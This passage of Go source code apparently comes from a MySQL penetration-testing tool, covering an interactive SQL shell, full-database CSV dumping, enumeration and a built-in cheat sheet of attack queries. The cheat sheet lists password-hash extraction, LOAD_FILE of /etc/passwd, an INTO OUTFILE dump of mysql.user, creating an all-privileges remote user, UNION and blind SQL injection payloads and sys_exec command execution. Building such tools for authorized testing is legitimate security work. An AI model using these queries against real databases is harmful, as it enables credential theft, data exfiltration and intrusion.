            // Add multiStatements capability for interactive mode
            if strings.Contains(persistentDSN, "?") {
                persistentDSN += "&multiStatements=true"
            } else {
                persistentDSN += "?multiStatements=true"
            }
        }
        
        interactiveDB, err := sql.Open("mysql", persistentDSN)
        if err != nil {
            color.Red("Failed to open interactive connection: %v", err)
            return successMsg + "\nFailed to start interactive mode."
        }
        defer interactiveDB.Close()
        
        // Test the interactive connection
        if err := interactiveDB.Ping(); err != nil {
            color.Red("Failed to establish interactive connection: %v", err)
            return successMsg + "\nFailed to start interactive mode."
        }
        
        enterInteractiveMode(ctx, interactiveDB)
        return "" // No further output needed after interactive mode
    }

    // Enumeration if -Enum flag is set
    if cfg.Enum {
        verbosePrintln("Starting database enumeration")
        enumResult := enumerateMySQL(dbCtx, db)
        successMsg += "\n" + enumResult
        if cfg.EnumOutputFile != "" {
            verbosePrintln("Saving enumeration results to:", cfg.EnumOutputFile)
            file, err := os.Create(cfg.EnumOutputFile)
            if err != nil {
                color.Red("Error creating enumeration output file: %v", err)
            } else {
                defer file.Close()
                file.WriteString(enumResult)
                verbosePrintln("Enumeration results saved successfully")
            }
        }
    }

    // Check if command is dangerous
    if isDangerous(cfg.ExecCmd) && !cfg.AllowDangerous {
        warningMsg := color.YellowString("Warning: Command '%s' starts with a dangerous verb and is blocked. Use --allow-dangerous to execute.", cfg.ExecCmd)
        return successMsg + "\n" + warningMsg
    }

    // Execute the command if it's safe or allowed
    verbosePrintln("Executing SQL command:", cfg.ExecCmd)
    color.Blue("Executing command: %s", cfg.ExecCmd)

    // Execute with timeout context
    execCtx, execCancel := context.WithTimeout(ctx, 20*time.Second)
    defer execCancel()

    // Handle queries vs. non-query commands
    if isQueryCommand(cfg.ExecCmd) {
        verbosePrintln("Detected query command, using Query method")
        rows, err := db.QueryContext(execCtx, cfg.ExecCmd)
        if err != nil {
            errorMsg := color.RedString("Error executing query: %v", err)
            verbosePrintln("Query execution failed:", err)
            return successMsg + "\n" + errorMsg
        }
        defer rows.Close()

        // Format and display query results
        result := formatQueryResults(rows)
        return successMsg + "\n" + result
    } else {
        verbosePrintln("Detected non-query command, using Exec method")
        _, err = db.ExecContext(execCtx, cfg.ExecCmd)
        if err != nil {
            errorMsg := color.RedString("Error executing command: %v", err)
            verbosePrintln("Command execution failed:", err)
            return successMsg + "\n" + errorMsg
        }
    }

    verbosePrintln("Command executed successfully")
    return successMsg + "\nCommand executed successfully."
}

// commandMatches checks if a command matches a pattern (case-insensitive)
func commandMatches(cmd, pattern string) bool {
    return strings.HasPrefix(strings.ToUpper(strings.TrimSpace(cmd)), pattern)
}

// dumpAllDatabases extracts all data from all accessible databases
func dumpAllDatabases(ctx context.Context, db *sql.DB) string {
    var summary strings.Builder
    summary.WriteString("Database Dump Summary:\n")
    
    // Create dump directory if it doesn't exist
    if err := os.MkdirAll(cfg.DumpDir, 0755); err != nil {
        errMsg := fmt.Sprintf("Failed to create dump directory: %v", err)
        color.Red(errMsg)
        return errMsg
    }
    
    // Create an index file for the dump
    indexFile, err := os.Create(filepath.Join(cfg.DumpDir, "dump_index.txt"))
    if err != nil {
        errMsg := fmt.Sprintf("Failed to create dump index file: %v", err)
        color.Red(errMsg)
        return errMsg
    }
    defer indexFile.Close()
    
    // Write header to index file
    hostname, _ := os.Hostname()
    indexFile.WriteString(fmt.Sprintf("MySQL Dump from %s to %s:%d\n", hostname, cfg.Host, cfg.Port))
    indexFile.WriteString(fmt.Sprintf("Date: %s\n", time.Now().Format(time.RFC1123)))
    indexFile.WriteString(fmt.Sprintf("User: %s\n\n", cfg.SingleUser))
    
    // Get server version
    var version string
    err = db.QueryRowContext(ctx, "SELECT VERSION()").Scan(&version)
    if err != nil {
        summary.WriteString(fmt.Sprintf("Error getting server version: %v\n", err))
    } else {
        indexFile.WriteString(fmt.Sprintf("Server Version: %s\n\n", version))
        summary.WriteString(fmt.Sprintf("Server Version: %s\n", version))
    }
    
    // Get list of databases
    dbRows, err := db.QueryContext(ctx, "SHOW DATABASES")
    if err != nil {
        errMsg := fmt.Sprintf("Failed to list databases: %v", err)
        color.Red(errMsg)
        summary.WriteString(errMsg + "\n")
        return summary.String()
    }
    defer dbRows.Close()
    
    // Create a progress bar for databases
    var databases []string
    for dbRows.Next() {
        var dbName string
        if err := dbRows.Scan(&dbName); err != nil {
            fmt.Printf("Error reading database name: %v\n", err)
            continue
        }
        databases = append(databases, dbName)
    }
    
    summary.WriteString(fmt.Sprintf("Found %d databases\n", len(databases)))
    indexFile.WriteString(fmt.Sprintf("Databases: %d\n\n", len(databases)))
    
    // Create database progress bar
    dbBar := progressbar.NewOptions(len(databases),
        progressbar.OptionSetDescription("Dumping databases"),
        progressbar.OptionSetWidth(50),
        progressbar.OptionShowCount(),
    )
    
    // Process each database
    for _, dbName := range databases {
        // Skip system databases if they exist
        if isSystemDB(dbName) {
            summary.WriteString(fmt.Sprintf("Skipped system database: %s\n", dbName))
            indexFile.WriteString(fmt.Sprintf("Database: %s (skipped - system database)\n", dbName))
            dbBar.Add(1)
            continue
        }
        
        // Create a directory for this database
        dbDir := filepath.Join(cfg.DumpDir, sanitizeFilename(dbName))
        if err := os.MkdirAll(dbDir, 0755); err != nil {
            summary.WriteString(fmt.Sprintf("Failed to create directory for %s: %v\n", dbName, err))
            dbBar.Add(1)
            continue
        }
        
        // Write database info to index
        indexFile.WriteString(fmt.Sprintf("Database: %s\n", dbName))
        
        // Get tables for this database
        tableCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
        tableRows, err := db.QueryContext(tableCtx, fmt.Sprintf("SHOW TABLES FROM `%s`", dbName))
        
        if err != nil {
            cancel()
            summary.WriteString(fmt.Sprintf("Failed to list tables in %s: %v\n", dbName, err))
            indexFile.WriteString(fmt.Sprintf("  Error: %v\n", err))
            dbBar.Add(1)
            continue
        }
        
        // Collect table names
        var tables []string
        for tableRows.Next() {
            var tableName string
            if err := tableRows.Scan(&tableName); err != nil {
                fmt.Printf("Error reading table name: %v\n", err)
                continue
            }
            tables = append(tables, tableName)
        }
        tableRows.Close()
        cancel()
        
        // Write tables to index
        indexFile.WriteString(fmt.Sprintf("  Tables: %d\n", len(tables)))
        for _, tableName := range tables {
            indexFile.WriteString(fmt.Sprintf("    - %s\n", tableName))
        }
        
        // Create table schema file for this database
        schemaFile, err := os.Create(filepath.Join(dbDir, "schema.sql"))
        if err != nil {
            summary.WriteString(fmt.Sprintf("Failed to create schema file for %s: %v\n", dbName, err))
        } else {
            // Get create statements for each table
            for _, tableName := range tables {
                schemaCtx, schemaCancel := context.WithTimeout(ctx, 10*time.Second)
                var createStmt string
                err := db.QueryRowContext(schemaCtx, fmt.Sprintf("SHOW CREATE TABLE `%s`.`%s`", dbName, tableName)).Scan(&tableName, &createStmt)
                schemaCancel()
                
                if err != nil {
                    schemaFile.WriteString(fmt.Sprintf("-- Failed to get schema for %s: %v\n", tableName, err))
                } else {
                    schemaFile.WriteString(createStmt + ";\n\n")
                }
            }
            schemaFile.Close()
        }
        
        // Create a progress bar for tables
        if !cfg.QuietDump {
            fmt.Printf("\nDumping database: %s (%d tables)\n", dbName, len(tables))
        }
        
        tableBar := progressbar.NewOptions(len(tables),
            progressbar.OptionSetDescription(fmt.Sprintf("Tables in %s", dbName)),
            progressbar.OptionSetWidth(40),
            progressbar.OptionShowCount(),
        )
        
        tableCount := 0
        rowCount := 0
        
        // Process each table
        for _, tableName := range tables {
            // Use database
            useCtx, useCancel := context.WithTimeout(ctx, 5*time.Second)
            _, err := db.ExecContext(useCtx, fmt.Sprintf("USE `%s`", dbName))
            useCancel()
            
            if err != nil {
                summary.WriteString(fmt.Sprintf("Failed to use database %s: %v\n", dbName, err))
                tableBar.Add(1)
                continue
            }
            
            // Get total rows (approximate) for this table
            var rowCountApprox int
            countCtx, countCancel := context.WithTimeout(ctx, 10*time.Second)
            err = db.QueryRowContext(countCtx, fmt.Sprintf("SELECT COUNT(*) FROM `%s`", tableName)).Scan(&rowCountApprox)
            countCancel()
            
            if err != nil {
                if !cfg.QuietDump {
                    fmt.Printf("  Failed to count rows in %s: %v\n", tableName, err)
                }
                rowCountApprox = 0
            }
            
            // Set up a query to fetch data with a limit if configured
            queryCtx, queryCancel := context.WithTimeout(ctx, 30*time.Second)
            rows, err := db.QueryContext(queryCtx, fmt.Sprintf("SELECT * FROM `%s`", tableName))
            
            if err != nil {
                queryCancel()
                summary.WriteString(fmt.Sprintf("Failed to query table %s: %v\n", tableName, err))
                tableBar.Add(1)
                continue
            }
            
            // Get column names and types
            columns, err := rows.Columns()
            if err != nil {
                rows.Close()
                queryCancel()
                summary.WriteString(fmt.Sprintf("Failed to get columns for %s: %v\n", tableName, err))
                tableBar.Add(1)
                continue
            }
            
            // Create output file for this table
            tableFile, err := os.Create(filepath.Join(dbDir, tableName+".csv"))
            if err != nil {
                rows.Close()
                queryCancel()
                summary.WriteString(fmt.Sprintf("Failed to create file for %s: %v\n", tableName, err))
                tableBar.Add(1)
                continue
            }
            
            // Write CSV header
            tableFile.WriteString(strings.Join(columns, ",") + "\n")
            
            // Prepare data containers
            values := make([]interface{}, len(columns))
            scanArgs := make([]interface{}, len(columns))
            for i := range values {
                scanArgs[i] = &values[i]
            }
            
            // Create table progress bar if not in quiet mode
            var rowsBar *progressbar.ProgressBar
            if !cfg.QuietDump && rowCountApprox > 0 {
                rowsBar = progressbar.NewOptions(rowCountApprox,
                    progressbar.OptionSetDescription(fmt.Sprintf("Rows in %s", tableName)),
                    progressbar.OptionSetWidth(30),
                )
            }
            
            // Process rows
            tableRowCount := 0
            maxRows := cfg.MaxRowsPerFile
            fileIndex := 1
            
            for rows.Next() {
                // If max rows per file is reached, open a new file
                if maxRows > 0 && tableRowCount >= maxRows {
                    tableFile.Close()
                    fileIndex++
                    tableFile, err = os.Create(filepath.Join(dbDir, fmt.Sprintf("%s.part%d.csv", tableName, fileIndex)))
                    if err != nil {
                        summary.WriteString(fmt.Sprintf("Failed to create part file for %s: %v\n", tableName, err))
                        break
                    }
                    // Write CSV header to new file
                    tableFile.WriteString(strings.Join(columns, ",") + "\n")
                    tableRowCount = 0
                }
                
                // Scan row data
                if err := rows.Scan(scanArgs...); err != nil {
                    summary.WriteString(fmt.Sprintf("Error scanning row in %s: %v\n", tableName, err))
                    continue
                }
                
                // Format values as CSV
                var rowValues []string
                for _, val := range values {
                    rowValues = append(rowValues, formatValueForCSV(val))
                }
                
                // Write row to file
                tableFile.WriteString(strings.Join(rowValues, ",") + "\n")
                tableRowCount++
                rowCount++
                
                // Update progress bar for rows
                if rowsBar != nil {
                    rowsBar.Add(1)
                }
            }
            
            // Clean up
            tableFile.Close()
            rows.Close()
            queryCancel()
            
            tableCount++
            tableBar.Add(1)
            
            // Note in summary
            if fileIndex > 1 {
                summary.WriteString(fmt.Sprintf("Dumped %s.%s: %d rows in %d files\n", dbName, tableName, tableRowCount, fileIndex))
            } else {
                summary.WriteString(fmt.Sprintf("Dumped %s.%s: %d rows\n", dbName, tableName, tableRowCount))
            }
        }
        
        // Add database summary
        summary.WriteString(fmt.Sprintf("Database %s: %d tables, %d total rows\n", dbName, tableCount, rowCount))
        dbBar.Add(1)
    }
    
    // Final summary
    summary.WriteString(fmt.Sprintf("\nDump complete. Files saved to %s\n", cfg.DumpDir))
    
    // Write summary to index file
    indexFile.WriteString("\nSummary:\n")
    indexFile.WriteString(summary.String())
    
    return summary.String()
}

// isSystemDB checks if a database is a system database that should be skipped
func isSystemDB(name string) bool {
    systemDBs := []string{"information_schema", "performance_schema", "mysql", "sys"}
    name = strings.ToLower(name)
    for _, sysDB := range systemDBs {
        if name == sysDB {
            return true
        }
    }
    return false
}

// sanitizeFilename makes a string safe to use as a filename
func sanitizeFilename(name string) string {
    name = strings.ReplaceAll(name, "/", "_")
    name = strings.ReplaceAll(name, "\\", "_")
    name = strings.ReplaceAll(name, ":", "_")
    name = strings.ReplaceAll(name, "*", "_")
    name = strings.ReplaceAll(name, "?", "_")
    name = strings.ReplaceAll(name, "\"", "_")
    name = strings.ReplaceAll(name, "<", "_")
    name = strings.ReplaceAll(name, ">", "_")
    name = strings.ReplaceAll(name, "|", "_")
    name = strings.ReplaceAll(name, " ", "_")
    return name
}

// formatValueForCSV formats a value for safe CSV output
func formatValueForCSV(val interface{}) string {
    if val == nil {
        return "NULL"
    }
    
    // Convert bytes to string
    b, ok := val.([]byte)
    if ok {
        val = string(b)
    }
    
    // Convert to string and escape CSV special characters
    str := fmt.Sprintf("%v", val)
    
    // Escape quotes and wrap with quotes if contains special chars
    if strings.ContainsAny(str, ",\"\r\n") {
        str = strings.ReplaceAll(str, "\"", "\"\"")
        str = "\"" + str + "\""
    }
    
    return str
}

// PentestCategory defines a category of pentest commands
type PentestCategory struct {
    Name        string
    Description string
    Commands    []PentestCommand
}

// PentestCommand defines a specific MySQL command for pentesting
type PentestCommand struct {
    Name        string
    Description string
    Command     string
    Example     string
    Dangerous   bool
}

// getMySQLPentestCommands returns a list of categories and commands for MySQL pentesting
func getMySQLPentestCommands() []PentestCategory {
    return []PentestCategory{
        {
            Name:        "Enumeration",
            Description: "Commands for gathering information about the database server",
            Commands: []PentestCommand{
                {
                    Name:        "Version",
                    Description: "Get MySQL server version",
                    Command:     "SELECT VERSION();",
                    Example:     "SELECT VERSION();",
                    Dangerous:   false,
                },
                {
                    Name:        "User Information",
                    Description: "Get current user and privileges",
                    Command:     "SELECT USER(), CURRENT_USER();",
                    Example:     "SELECT USER(), CURRENT_USER();",
                    Dangerous:   false,
                },
                {
                    Name:        "User Privileges",
                    Description: "Show current user's privileges",
                    Command:     "SHOW GRANTS;",
                    Example:     "SHOW GRANTS;",
                    Dangerous:   false,
                },
                {
                    Name:        "All Users",
                    Description: "List all users in the MySQL server",
                    Command:     "SELECT user, host FROM mysql.user;",
                    Example:     "SELECT user, host FROM mysql.user;",
                    Dangerous:   false,
                },
                {
                    Name:        "List Databases",
                    Description: "Show all accessible databases",
                    Command:     "SHOW DATABASES;",
                    Example:     "SHOW DATABASES;",
                    Dangerous:   false,
                },
                {
                    Name:        "List Tables",
                    Description: "Show tables in current/specified database",
                    Command:     "SHOW TABLES FROM database_name;",
                    Example:     "SHOW TABLES FROM information_schema;",
                    Dangerous:   false,
                },
                {
                    Name:        "Table Structure",
                    Description: "Show structure of a table",
                    Command:     "DESCRIBE database_name.table_name;",
                    Example:     "DESCRIBE mysql.user;",
                    Dangerous:   false,
                },
                {
                    Name:        "Configuration",
                    Description: "View important MySQL configuration variables",
                    Command:     "SHOW VARIABLES;",
                    Example:     "SHOW VARIABLES LIKE '%version%';",
                    Dangerous:   false,
                },
                {
                    Name:        "Processes",
                    Description: "View running processes/queries",
                    Command:     "SHOW PROCESSLIST;",
                    Example:     "SHOW PROCESSLIST;",
                    Dangerous:   false,
                },
            },
        },
        {
            Name:        "Data Extraction",
            Description: "Commands for extracting data from the database",
            Commands: []PentestCommand{
                {
                    Name:        "Basic Select",
                    Description: "Select data from a table with limit",
                    Command:     "SELECT * FROM database_name.table_name LIMIT 10;",
                    Example:     "SELECT * FROM mysql.user LIMIT 10;",
                    Dangerous:   false,
                },
                {
                    Name:        "Column Selection",
                    Description: "Select specific columns",
                    Command:     "SELECT column1, column2 FROM database_name.table_name LIMIT 10;",
                    Example:     "SELECT user, host, authentication_string FROM mysql.user LIMIT 10;",
                    Dangerous:   false,
                },
                {
                    Name:        "Conditional Select",
                    Description: "Select data with conditions",
                    Command:     "SELECT * FROM database_name.table_name WHERE column_name = 'value';",
                    Example:     "SELECT * FROM mysql.user WHERE user = 'root';",
                    Dangerous:   false,
                },
                {
                    Name:        "Table Search",
                    Description: "Search for tables with specific names",
                    Command:     "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%pattern%';",
                    Example:     "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%';",
                    Dangerous:   false,
                },
                {
                    Name:        "Column Search",
                    Description: "Search for columns with specific names",
                    Command:     "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pattern%';",
                    Example:     "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';",
                    Dangerous:   false,
                },
            },
        },
        {
            Name:        "Authentication",
            Description: "Commands related to user authentication and password hashes",
            Commands: []PentestCommand{
                {
                    Name:        "Password Hashes",
                    Description: "Get password hashes (MySQL < 5.7)",
                    Command:     "SELECT user, host, password FROM mysql.user;",
                    Example:     "SELECT user, host, password FROM mysql.user;",
                    Dangerous:   false,
                },
                {
                    Name:        "Authentication String",
                    Description: "Get password hashes (MySQL >= 5.7)",
                    Command:     "SELECT user, host, authentication_string FROM mysql.user;",
                    Example:     "SELECT user, host, authentication_string FROM mysql.user;",
                    Dangerous:   false,
                },
                {
                    Name:        "Plugin Info",
                    Description: "Get authentication plugin information",
                    Command:     "SELECT user, host, plugin FROM mysql.user;",
                    Example:     "SELECT user, host, plugin FROM mysql.user;",
                    Dangerous:   false,
                },
                {
                    Name:        "Create User",
                    Description: "Create a new user",
                    Command:     "CREATE USER 'username'@'host' IDENTIFIED BY 'password';",
                    Example:     "CREATE USER 'pentester'@'%' IDENTIFIED BY 'Password123!';",
                    Dangerous:   true,
                },
                {
                    Name:        "Grant Privileges",
                    Description: "Grant privileges to a user",
                    Command:     "GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'host';",
                    Example:     "GRANT ALL PRIVILEGES ON *.* TO 'pentester'@'%' WITH GRANT OPTION;",
                    Dangerous:   true,
                },
            },
        },
        {
            Name:        "File System Access",
            Description: "Commands for accessing the underlying file system",
            Commands: []PentestCommand{
                {
                    Name:        "Load File",
                    Description: "Read a file from the server's filesystem",
                    Command:     "SELECT LOAD_FILE('/path/to/file');",
                    Example:     "SELECT LOAD_FILE('/etc/passwd');",
                    Dangerous:   false,
                },
                {
                    Name:        "Secure File Priv",
                    Description: "Check file write restrictions",
                    Command:     "SHOW VARIABLES LIKE 'secure_file_priv';",
                    Example:     "SHOW VARIABLES LIKE 'secure_file_priv';",
                    Dangerous:   false,
                },
                {
                    Name:        "Export to File",
                    Description: "Write query results to a file",
                    Command:     "SELECT field FROM table INTO OUTFILE '/path/to/file';",
                    Example:     "SELECT * FROM mysql.user INTO OUTFILE '/tmp/users.txt';",
                    Dangerous:   true,
                },
                {
                    Name:        "Import from File",
                    Description: "Load data from a file into a table",
                    Command:     "LOAD DATA INFILE '/path/to/file' INTO TABLE database_name.table_name;",
                    Example:     "LOAD DATA INFILE '/tmp/data.csv' INTO TABLE my_database.my_table;",
                    Dangerous:   true,
                },
            },
        },
        {
            Name:        "Advanced Techniques",
            Description: "Advanced MySQL penetration testing techniques",
            Commands: []PentestCommand{
                {
                    Name:        "Union Select",
                    Description: "Basic UNION SELECT template for SQL injection",
                    Command:     "UNION SELECT column1, column2, ... FROM table_name",
                    Example:     "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -",
                    Dangerous:   false,
                },
                {
                    Name:        "SQL Information Schema",
                    Description: "Query valuable information from information_schema",
                    Command:     "SELECT table_schema, table_name FROM information_schema.tables;",
                    Example:     "SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql';",
                    Dangerous:   false,
                },
                {
                    Name:        "Blind SQL Injection",
                    Description: "Blind SQL injection template using SLEEP()",
                    Command:     "SELECT IF(condition, true_result, false_result)",
                    Example:     "SELECT IF(SUBSTR(user(),1,1)='r', SLEEP(5), 0);",
                    Dangerous:   false,
                },
                {
                    Name:        "Command Execution",
                    Description: "Execute system commands (requires UDF)",
                    Command:     "SELECT sys_exec('command');",
                    Example:     "SELECT sys_exec('id');",
                    Dangerous:   true,
                },
            },
        },
    }
}

// displayPentestCommands shows available pentest commands for MySQL
func displayPentestCommands() {
    categories := getMySQLPentestCommands()
    
    fmt.Println("\nMySQL Penetration Testing Commands:")
    fmt.Println("=================================")
    
    for _, category := range categories {
        color.New(color.FgHiGreen, color.Bold).Printf("\n%s - %s\n", category.Name, category.Description)
        
        for _, cmd := range category.Commands {
            if cmd.Dangerous {
                color.New(color.FgYellow).Printf("  ⚠ %s: %s\n", cmd.Name, cmd.Description)
            } else {
                color.New(color.FgCyan).Printf("  • %s: %s\n", cmd.Name, cmd.Description)
            }
            fmt.Printf("    Command: %s\n", cmd.Command)
            fmt.Printf("    Example: %s\n", cmd.Example)
        }
    }
    
    fmt.Println("\nNote: Commands marked with ⚠ are potentially dangerous and require --allow-dangerous flag.")
    fmt.Println("For more information on a specific category, type 'pentest category_name'")
}

// displayPentestCategoryDetail shows detailed commands for a specific category
func displayPentestCategoryDetail(categoryName string) {
    categories := getMySQLPentestCommands()
    categoryName = strings.ToLower(categoryName)
    
    for _, category := range categories {
        if strings.ToLower(category.Name) == categoryName {
            color.New(color.FgHiGreen, color.Bold).Printf("\n%s Commands - %s\n", category.Name, category.Description)
            color.New(color.FgHiGreen, color.Bold).Println("==============================================")
            
            for _, cmd := range category.Commands {
                if cmd.Dangerous {
                    color.New(color.FgYellow, color.Bold).Printf("\n⚠ %s\n", cmd.Name)
                    fmt.Println("  Description: " + cmd.Description + " (DANGEROUS)")
                } else {
                    color.New(color.FgCyan, color.Bold).Printf("\n• %s\n", cmd.Name)
                    fmt.Println("  Description: " + cmd.Description)
                }
                fmt.Println("  Command:     " + cmd.Command)
                fmt.Println("  Example:     " + cmd.Example)
            }
            fmt.Println("\nTo execute a command, simply type it at the mysql> prompt.")
            return
        }
    }
    
    fmt.Printf("Category '%s' not found. Available categories:\n", categoryName)
    for _, category := range categories {
        fmt.Printf("  • %s\n", category.Name)
    }
}

// enterInteractiveMode provides an interactive shell for database commands
func enterInteractiveMode(ctx context.Context, db *sql.DB) {
    fmt.Println("Entering interactive mode. Type 'help' for commands, 'exit' to quit.")
    reader := bufio.NewReader(os.Stdin)
    prompt := "mysql> "
    
    // Set database for use command
    var currentDB string

    for {
        // Show current database in prompt if one is selected
        currentPrompt := prompt
        if currentDB != "" {
            currentPrompt = fmt.Sprintf("mysql [%s]> ", currentDB)
        }
        
        fmt.Print(currentPrompt)
        input, err := reader.ReadString('\n')
        if err != nil {
            color.Red("Error reading input: %v", err)
            return
        }
        cmd := strings.TrimSpace(input)

        if cmd == "" {
            continue
        }

        // Handle special commands
        switch strings.ToLower(cmd) {
        case "exit", "quit", "\\q":
            fmt.Println("Exiting interactive mode.")
            return
        case "help", "\\h", "\\?":
            displayInteractiveHelp()
            continue
        case "status", "\\s":
            displayStatus(db)
            continue
        case "pentest", "\\p":
            displayPentestCommands()
            continue
        }
        
        // Handle pentest category display
        if strings.HasPrefix(strings.ToLower(cmd), "pentest ") {
            categoryName := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd), "pentest "))
            displayPentestCategoryDetail(categoryName)
            continue
        }
        
        // Special handling for SHOW DATABASES command
        if commandMatches(cmd, "SHOW DATABASES") {
            execCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
            rows, err := db.QueryContext(execCtx, "SHOW DATABASES")
            if err != nil {
                color.Red("Error listing databases: %v", err)
                cancel()
                continue
            }
            
            fmt.Println("Available databases:")
            fmt.Println("-------------------")
            count := 0
            
            for rows.Next() {
                var dbName string
                if err := rows.Scan(&dbName); err != nil {
                    color.Red("Error reading database name: %v", err)
                    continue
                }
                
                if isSystemDB(dbName) {
                    // Show system databases in a different color
                    color.Yellow("  %s (system)", dbName)
                } else {
                    // Show user databases with usage hint
                    color.Green("  %s (use `%s`;)", dbName, dbName)
                }
                count++
            }
            
            rows.Close()
            cancel()
            
            if count == 0 {
                fmt.Println("  No databases found or insufficient privileges")
            } else {
                fmt.Printf("\n%d databases found\n", count)
            }
            continue
        }
        
        // Handle USE database command to track current database
        if strings.HasPrefix(strings.ToUpper(cmd), "USE ") {
            // Extract the database name preserving its original case
            dbNamePart := strings.TrimSpace(strings.TrimPrefix(cmd, "USE "))
            dbNamePart = strings.TrimPrefix(dbNamePart, "use ")
            
            // Remove backticks, quotes, and trailing semicolons
            dbName := strings.Trim(dbNamePart, "`'\"")
            dbName = strings.TrimSuffix(dbName, ";")
            
            // Execute the USE command with the exact case
            execCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
            _, err := db.ExecContext(execCtx, fmt.Sprintf("USE `%s`", dbName))
            cancel()
            
            if err != nil {
                color.Red("Error switching to database %s: %v", dbName, err)
            } else {
                currentDB = dbName
                fmt.Printf("Database changed to %s\n", dbName)
            }
            continue
        }

        // Check if command is dangerous
        if isDangerous(cmd) && !cfg.AllowDangerous {
            color.Yellow("Warning: Command '%s' starts with a dangerous verb and is blocked. Use --allow-dangerous to execute.", cmd)
            continue
        }

        // Execute SQL command with appropriate timeout
        execCtx, cancel := context.WithTimeout(ctx, 20*time.Second)

        if isQueryCommand(cmd) {
            rows, err := db.QueryContext(execCtx, cmd)
            if err != nil {
                color.Red("Error executing query: %v", err)
                cancel() // Cancel context to avoid resource leak
                continue
            }
            
            result := formatQueryResults(rows)
            rows.Close() // Close rows explicitly before canceling context
            cancel()     // Cancel context after using it
            fmt.Println(result)
        } else {
            _, err := db.ExecContext(execCtx, cmd)
            cancel() // Cancel context after use
            if err != nil {
                color.Red("Error executing command: %v", err)
                continue
            }
            fmt.Println("Command executed successfully.")
        }
    }
}

// displayStatus shows connection and server information
func displayStatus(db *sql.DB) {
    fmt.Println("--------------")
    fmt.Printf("Connection: %s@%s:%d\n", cfg.SingleUser, cfg.Host, cfg.Port)
    
    // Get server version
    var version string
    err := db.QueryRow("SELECT VERSION()").Scan(&version)
    if err != nil {
        fmt.Println("Server version: Error retrieving version")
    } else {
        fmt.Println("Server version:", version)
    }
    
    // Get current user
    var user string
    err = db.QueryRow("SELECT CURRENT_USER()").Scan(&user)
    if err != nil {
        fmt.Println("Current user: Error retrieving user")
    } else {
        fmt.Println("Current user:", user)
    }
    
    // Get current database if any
    var database sql.NullString
    err = db.QueryRow("SELECT DATABASE()").Scan(&database)
    if err != nil {
        fmt.Println("Current database: Error retrieving database")
    } else if database.Valid {
        fmt.Println("Current database:", database.String)
    } else {
        fmt.Println("Current database: None selected")
    }
    
    fmt.Println("--------------")
}

// displayInteractiveHelp shows available commands in interactive mode
func displayInteractiveHelp() {
    fmt.Println("Available commands:")
    fmt.Println("  help (\\h, \\?)       Display this help menu")
    fmt.Println("  exit (quit, \\q)      Exit interactive mode")
    fmt.Println("  status (\\s)          Display connection information")
    fmt.Println("  pentest (\\p)         Show MySQL pentest commands and examples")
    fmt.Println("  pentest <category>    Show detailed commands for a specific category")
    fmt.Println("  USE <database>        Switch to specified database")
    fmt.Println("  SHOW DATABASES;       List all databases")
    fmt.Println("  SHOW TABLES;          List tables in the current database")
    fmt.Println("  DESCRIBE <table>;     Show table structure")
    fmt.Println("  SELECT * FROM <table> LIMIT 10;  Show limited contents of a table")
    fmt.Println("  Any valid SQL command can be executed.")
    fmt.Println()
    fmt.Println("Note: Use --allow-dangerous flag at startup to enable potentially destructive commands.")
}

// isQueryCommand determines if an SQL command is a query that returns rows
func isQueryCommand(cmd string) bool {
    verb := getSqlVerb(cmd)
    queryVerbs := []string{"SELECT", "SHOW", "DESCRIBE", "DESC", "EXPLAIN"}

    for _, v := range queryVerbs {
        if verb == v {
            return true
        }
    }
    return false
}

// formatQueryResults formats query results in a readable way
func formatQueryResults(rows *sql.Rows) string {
    var output strings.Builder
    output.WriteString("Query Results:\n")

    // Get column names
    columns, err := rows.Columns()
    if err != nil {
        return fmt.Sprintf("Error fetching column info: %v", err)
    }

    // Create a slice of interface{} to store the row values
    values := make([]interface{}, len(columns))
    valuePtrs := make([]interface{}, len(columns))
    for i := range values {
        valuePtrs[i] = &values[i]
    }

    // Column headers
    for i, col := range columns {
        if i > 0 {
            output.WriteString("\t")
        }
        output.WriteString(col)
    }
    output.WriteString("\n")

    // Separator line
    for i, col := range columns {
        if i > 0 {
            output.WriteString("\t")
        }
        output.WriteString(strings.Repeat("-", len(col)))
    }
    output.WriteString("\n")

    // Row data
    rowCount := 0
    for rows.Next() {
        err = rows.Scan(valuePtrs...)
        if err != nil {
            return fmt.Sprintf("Error scanning row: %v", err)
        }

        for i, val := range values {
            if i > 0 {
                output.WriteString("\t")
            }

            // Convert each value to string based on its type
            var valStr string
            b, ok := val.([]byte)
            if ok {
                valStr = string(b)
            } else if val == nil {
                valStr = "NULL"
            } else {
                valStr = fmt.Sprintf("%v", val)
            }

            output.WriteString(valStr)
        }
        output.WriteString("\n")
        rowCount++
    }

    if err = rows.Err(); err != nil {
        return fmt.Sprintf("Error iterating rows: %v", err)
    }

    output.WriteString(fmt.Sprintf("\nTotal rows: %d\n", rowCount))
    return output.String()
}

// enumerateMySQL gathers information about privileges, databases, and tables
func enumerateMySQL(ctx context.Context, db *sql.DB) string {
    var output strings.Builder
    var queryError bool

    // Enumerate privileges
    verbosePrintln("Enumerating user privileges")
    output.WriteString("User Privileges:\n")
    rows, err := db.QueryContext(ctx, "SHOW GRANTS")
    if err != nil {
        verbosePrintln("Error fetching grants:", err)
        output.WriteString(fmt.Sprintf("Error fetching grants: %v\n", err))
        queryError = true
    } else {
        defer rows.Close()
        grantCount := 0
        for rows.Next() {
            var grant string
            if err := rows.Scan(&grant); err != nil {
                verbosePrintln("Error scanning grant:", err)
                output.WriteString(fmt.Sprintf("Error scanning grant: %v\n", err))
            } else {
                grantCount++
                output.WriteString("  " + grant + "\n")
            }
        }
        verbosePrintf("Found %d privilege records\n", grantCount)
        if err := rows.Err(); err != nil {
            verbosePrintln("Error iterating grants:", err)
            output.WriteString(fmt.Sprintf("Error iterating grants: %v\n", err))
        }
    }

    // Get MySQL/MariaDB version
    verbosePrintln("Checking database version")
    output.WriteString("\nDatabase Version:\n")
